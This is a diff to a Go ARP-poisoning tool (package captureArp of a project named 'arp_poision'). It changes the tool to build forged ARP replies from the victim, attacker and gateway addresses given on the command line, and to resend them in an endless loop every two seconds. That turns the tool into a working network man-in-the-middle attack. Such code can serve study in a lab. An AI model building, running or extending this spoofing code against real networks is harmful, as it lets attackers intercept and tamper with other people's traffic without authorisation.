@@ -3,6 +3,7 @@ package captureArp
 import (
 	"log"
 	"net"
+	"time"
 
 	commandlinehandle "arp_poision/commandLineHandle"
 
@@ -47,9 +48,8 @@ func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) 
 }
 
 func Packet(handler *pcap.Handle, args commandlinehandle.ParsedCommandLine) {
-	mac := net.HardwareAddr{0xFF, 0xAA, 0xFA, 0xAA, 0xFF, 0xAA}
 	buffer := gopacket.NewSerializeBuffer()
-	eth := craft_ethernet(mac, mac)
+	eth := craft_ethernet(args.VictimMAC, args.AttackerMAC)
 	// FIXED: Make a function that convert these type and parse them and check them
 	arp := craft_arp(args.AttackerMAC, args.VictimMAC, args.DefaultGateway, args.VictimIP, layers.ARPReply)
 	opt := gopacket.SerializeOptions{
@@ -60,9 +60,12 @@ func Packet(handler *pcap.Handle, args commandlinehandle.ParsedCommandLine) {
 	if err != nil {
 		log.Fatal("Error serilize the packet ", err)
 	}
-	err = handler.WritePacketData(buffer.Bytes())
-	if err != nil {
-		log.Fatal("Error serilize the packet ", err)
+	for {
+		err = handler.WritePacketData(buffer.Bytes())
+		if err != nil {
+			log.Fatal("Error serilize the packet ", err)
+		}
+		time.Sleep(2 * time.Second)
 	}
 
 	log.Printf("Everything goes as expected packet has been sent \n")
